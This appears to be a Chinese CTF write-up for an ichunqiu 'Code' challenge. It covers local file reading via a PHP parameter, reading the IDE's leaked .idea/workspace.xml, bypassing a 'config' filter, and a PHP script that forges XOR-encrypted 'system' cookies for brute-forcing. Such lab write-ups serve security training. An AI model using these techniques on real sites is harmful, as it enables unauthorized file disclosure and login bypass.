

# Code

* 访问网址，查看源码获得base64编码的图片，推测是文件包含，直接访问index.php
> http://f214c751d5284e7f97c43461bd76159eb3dcb99e810c49eb.changame.ichunqiu.com/index.php?jpg=index.php

* 继续查看源码，获得base64加密后的代码
> PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIERhdGU6IDIwMTUvMTEvMTYNCiAqIFRpbWU6IDE6MzENCiAqLw0KaGVhZGVyKCdjb250ZW50LXR5cGU6dGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgnKTsNCmlmKCEgaXNzZXQoJF9HRVRbJ2pwZyddKSkNCiAgICBoZWFkZXIoJ1JlZnJlc2g6MDt1cmw9Li9pbmRleC5waHA/anBnPWhlaS5qcGcnKTsNCiRmaWxlID0gJF9HRVRbJ2pwZyddOw0KZWNobyAnPHRpdGxlPmZpbGU6Jy4kZmlsZS4nPC90aXRsZT4nOw0KJGZpbGUgPSBwcmVnX3JlcGxhY2UoIi9bXmEtekEtWjAtOS5dKy8iLCIiLCAkZmlsZSk7DQokZmlsZSA9IHN0cl9yZXBsYWNlKCJjb25maWciLCJfIiwgJGZpbGUpOw0KJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsNCg0KZWNobyAiPGltZyBzcmM9J2RhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCwiLiR0eHQuIic+PC9pbWc+IjsNCg0KLyoNCiAqIENhbiB5b3UgZmluZCB0aGUgZmxhZyBmaWxlPw0KICoNCiAqLw0KDQo/Pg==

``` 
<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
header('content-type:text/html;charset=utf-8');
if(! isset($_GET['jpg']))
    header('Refresh:0;url=./index.php?jpg=hei.jpg');
$file = $_GET['jpg'];
echo '<title>file:'.$file.'</title>';
$file = preg_replace("/[^a-zA-Z0-9.]+/","", $file);
$file = str_replace("config","_", $file);
$txt = base64_encode(file_get_contents($file));

echo "<img src='data:image/gif;base64,".$txt."'></img>";

/*
 * Can you find the flag file?
 *
 */

?>
```

* pycharm编写的程序，会自动生成.idea目录，访问/.idea/下固定文件
> modules.xml  
> vcs.xml  
> workspace.xml  

> http://f214c751d5284e7f97c43461bd76159eb3dcb99e810c49eb.changame.ichunqiu.com/.idea/workspace.xml

* 得到目录信息
``` 
<component name="IdeDocumentHistory">
<option name="CHANGED_PATHS">
<list>
<option value="$PROJECT_DIR$/x.php"/>
<option value="$PROJECT_DIR$/config.php"/>
<option value="$PROJECT_DIR$/fl3g_ichuqiu.php"/>
</list>
</option>
</component>
```

* 阅读源码可知 str_replace("config","_", $file); 会将config转成_
> http://f214c751d5284e7f97c43461bd76159eb3dcb99e810c49eb.changame.ichunqiu.com/fl3gconfigichuqiu.php

* 又获得base64加密后的密文
``` 

<?php
/**
 * Created by PhpStorm.
 * Date: 2015/11/16
 * Time: 1:31
 */
error_reporting(E_ALL || ~E_NOTICE);
include('config.php');
function random($length, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz') {
    $hash = '';
    $max = strlen($chars) - 1;
    for($i = 0; $i < $length; $i++)	{
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}

function encrypt($txt,$key){
    for($i=0;$i<strlen($txt);$i++){
        $tmp .= chr(ord($txt[$i])+10);
    }
    $txt = $tmp;
    $rnd=random(4);
    $key=md5($rnd.$key);
    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $ttmp .= $txt[$i] ^ $key[++$s];
    }
    return base64_encode($rnd.$ttmp);
}
function decrypt($txt,$key){
    $txt=base64_decode($txt);
    $rnd = substr($txt,0,4);
    $txt = substr($txt,4);
    $key=md5($rnd.$key);

    $s=0;
    for($i=0;$i<strlen($txt);$i++){
        if($s == 32) $s = 0;
        $tmp .= $txt[$i]^$key[++$s];
    }
    for($i=0;$i<strlen($tmp);$i++){
        $tmp1 .= chr(ord($tmp[$i])-10);
    }
    return $tmp1;
}
$username = decrypt($_COOKIE['user'],$key);
if ($username == 'system'){
    echo $flag;
}else{
    setcookie('user',encrypt('guest',$key));
    echo "╮(╯▽╰)╭";
}
?>
```


* 到此只能看write up
``` 
<?php

function ss($txt,$m){

for($i=0;$i<strlen($m);$i++){

$tmp .= chr(ord($m[$i])+10);

}

$m=$tmp;

$tmp='';

$txt=base64_decode($txt);

$rnd = substr($txt,0,4);

$txt = substr($txt,4);

for($i=0;$i<strlen($txt);$i++){

$key .= $txt[$i] ^ $m[$i];

}

$s='0123456789abcdef';

$txt1='system';

for($i=0;$i<strlen($txt1);$i++){

$tmp .= chr(ord($txt1[$i])+10);

}

$txt1=$tmp;

$tmp='';

for($i=0;$i<16;$i++){

$tmp = $key.$s[$i];

for($ii=0;$ii<strlen($txt1);$ii++){

$txt2 .= $txt1[$ii] ^ $tmp[$ii];

}

echo base64_encode($rnd.$txt2).'</br>';

$txt2='';

}
}
ss('TzFBN0FPVh4c','guest');
?>
```

* 将获取到的一系列的密文放到burpsuit进行爆破, 添加cookie:user=xxxx

